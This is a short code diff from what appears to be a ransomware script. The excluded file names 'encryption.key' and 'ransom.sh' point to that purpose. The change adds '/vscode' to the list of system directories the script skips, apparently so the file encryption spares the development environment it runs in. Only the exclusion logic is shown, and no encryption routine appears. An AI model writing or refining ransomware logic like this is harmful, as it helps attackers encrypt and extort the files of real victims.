@@ -140,7 +140,7 @@ def main():
     exclude_files = ["main.py", "encryption.key", "ransom.sh"]
     exclude_paths = {os.path.join(script_dir, file) for file in exclude_files}
     
-    system_paths = ["/usr", "/bin", "/lib", "/etc", "/var", "/opt", "/sbin", "/dev", "/proc", "/sys", "/venv", "/workspaces", "/.codespaces"]
+    system_paths = ["/usr", "/bin", "/lib", "/etc", "/var", "/opt", "/sbin", "/dev", "/proc", "/sys", "/venv", "/workspaces", "/.codespaces", "/vscode"]
     # Convert system_paths to absolute paths before updating exclude_paths
     exclude_paths.update([os.path.abspath(path) for path in system_paths])
     
